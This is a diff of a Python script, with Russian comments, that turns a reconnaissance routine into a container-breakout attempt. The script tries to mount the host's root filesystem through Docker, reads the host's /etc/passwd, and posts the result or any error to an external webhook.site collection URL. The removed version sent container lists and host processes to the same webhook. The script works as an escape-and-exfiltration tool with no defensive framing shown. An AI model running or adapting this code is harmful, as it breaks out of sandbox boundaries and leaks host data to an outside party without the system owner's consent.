@@ -3,20 +3,20 @@ import requests
 
 WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"
 
-def check_host_activity():
-    # Попытка увидеть все контейнеры (включая те, что запущены не нами)
+def final_breakout_attempt():
     try:
-        # docker ps -a покажет все контейнеры, даже остановленные
-        cmd = ["docker", "ps", "-a"]
+        # Пробуем примонтировать корень хоста (/) в /mnt/host внутри контейнера
+        # Если это получится, мы сможем прочитать файл /etc/passwd хоста
+        cmd = ["docker", "run", "--rm", "-v", "/:/mnt/host", "alpine", "cat", "/mnt/host/etc/passwd"]
         output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode()
         
-        # Попытка увидеть процессы хоста (если мы действительно имеем доступ к ядру)
-        # ps aux показывает все процессы в системе
-        processes = subprocess.check_output(["ps", "aux"], stderr=subprocess.STDOUT).decode()[:1000]
-        
-        requests.post(WEBHOOK_URL, json={"containers": output, "processes": processes})
+        # Если команда прошла успешно, отправляем результат
+        requests.post(WEBHOOK_URL, json={"status": "BREAKOUT_SUCCESS", "host_passwd": output})
+    except subprocess.CalledProcessError as e:
+        # Если упало, отправляем ошибку, чтобы понять, какой именно уровень защиты сработал
+        requests.post(WEBHOOK_URL, json={"status": "BREAKOUT_FAILED", "error": e.output.decode()})
     except Exception as e:
-        requests.post(WEBHOOK_URL, json={"error": str(e)})
+        requests.post(WEBHOOK_URL, json={"status": "ERROR", "error": str(e)})
 
 if __name__ == "__main__":
-    check_host_activity()
+    final_breakout_attempt()
